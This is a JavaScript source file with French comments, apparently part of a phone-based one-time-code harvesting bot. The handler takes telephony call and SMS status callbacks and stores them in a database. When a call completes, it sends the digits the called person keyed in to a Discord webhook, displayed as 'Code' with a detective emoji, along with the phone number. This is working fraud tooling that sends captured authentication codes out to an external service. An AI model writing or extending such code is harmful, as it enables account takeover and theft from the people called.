module.exports = function(request, response) {
    /**
     * Fichier contenant les configurations nécéssaires au bon fonctionnement du système
     */
    const config = require('.././config');

    /**
     * Instanciation des dépendences permettant l'utilisation du webhook discord
     */
    const {
        Webhook,
        MessageBuilder
    } = require('discord-webhook-node');
    const hook = new Webhook(config.discordwebhook || '');

    /**
     * Intégration des dépendences SQLITE3
     */
    const sqlite3 = require('sqlite3').verbose();
    const db = new sqlite3.Database('./db/data.db');

    /**
     * Récupération des variables postées permettant d'ordonner la modification du status
     */
    var itsfrom = request.body.From || null;
    var itsto = request.body.To || null;
    var sid = request.body.CallSid;
    var date = Date.now();
    var status;

    /**
     * Iniation des variables permettant de définir les requêtes SQL
     */
    var table = null;
    var sidname = null;

    /**
     * Si il y a un sid avec le CallSid, alors c'est un appel, sinon c'est un SMS.
     */
    if (sid != undefined) {
        status = request.body.CallStatus;
        table = 'calls';
        sidname = 'callSid';
    } else {
        sid = request.body.SmsSid;
        status = request.body.SmsStatus;
        table = 'sms';
        sidname = 'smssid';
    }

    if (itsfrom == null || itsto == null || sid == undefined || sid == null) {
        return response.status(200).json({
            error: 'Please send all the needed post data.'
        });
    }

    /**
     * On vérifie si il n'y a pas déjà la donnée d'enregistrée en DB
     */
    db.get('SELECT ' + sidname + ' text FROM ' + table + ' WHERE ' + sidname + ' = ?', [sid], (err, row) => {
        if (err) {
            return console.log(err.message);
        }

        /**
         * Si elle n'est pas enregistrée, on l'insert pour la première fois
         */
        if (row == undefined) {
            db.run('INSERT INTO ' + table + '(itsfrom, itsto, status, ' + sidname + ', date) VALUES(?, ?, ?, ?, ?)', [itsfrom, itsto, status, sid, date], function(err) {
                if (err) {
                    return console.log(err.message);
                }

                return response.status(200).json({
                    inserted: 'All is alright.'
                });
            });
        } else {
            /**
             * Sinon on la met à jour, principalement le status
             */
            db.run('UPDATE ' + table + ' SET status = ?, itsfrom = ?, itsto = ?, date = ? WHERE ' + sidname + ' = ?', [status, itsfrom, itsto, date, sid], function(err) {
                if (err) {
                    return console.log(err.message);
                }

                /**
                 * Si c'est un status d'appel et qu'il est fini (completed), alors on envoi un webhook
                 * contenant le "digits" le code récupéré lors de l'appel.
                 * 
                 * On vérifie aussi si le lien webhook est bien défini, sinon on n'envoi pas de webhook.
                 */
                if (table == 'calls' && status == 'completed' && config.discordwebhook != undefined) {
                    /**
                     * On récupère toutes les infos sur l'appel
                     */
                    db.get('SELECT * FROM calls WHERE callSid  = ?', [sid], (err, row) => {
                        if (err) {
                            return console.error(err.message);
                        }

                        /**
                         * Si le code est vide, alors la personne n'as pas répondue / donné de code
                         */
                        var embed;

                        /**
                         * Si il y bien eu le code d'enregistré, alors on définie l'embed à envoyer
                         */
                        if (row.digits == '' || row.digits == undefined) {
                            embed = new MessageBuilder()
                                .setTitle(`:mobile_phone: ${itsto}`)
                                .setColor('15105570')
                                .setDescription(':man_detective: The user didn\'t respond or enter the code.')
                                .setFooter(row.user)
                                .setTimestamp();
                        } else {
                            /**
                             * Si c'est un appel de test, ne pas founir entièrement le code
                            */
                            if (row.user == 'test') row.digits = row.digits.slice(0, 3) + '***';

                            /**
                             * Elle a donné le code, on peut l'envoyer
                             */
                            embed = new MessageBuilder()
                                .setTitle(`:mobile_phone: ${itsto}`)
                                .setColor('1752220')
                                .setDescription(`:man_detective: Code : **${row.digits}**`)
                                .setFooter(row.user)
                                .setTimestamp();
                        }

                        /**
                         * Envoi du embed au webhook
                         */
                        hook.send(embed);
                    });
                }

                return response.status(200).json({
                    inserted: 'All is alright.'
                });
            });


        }
    });
};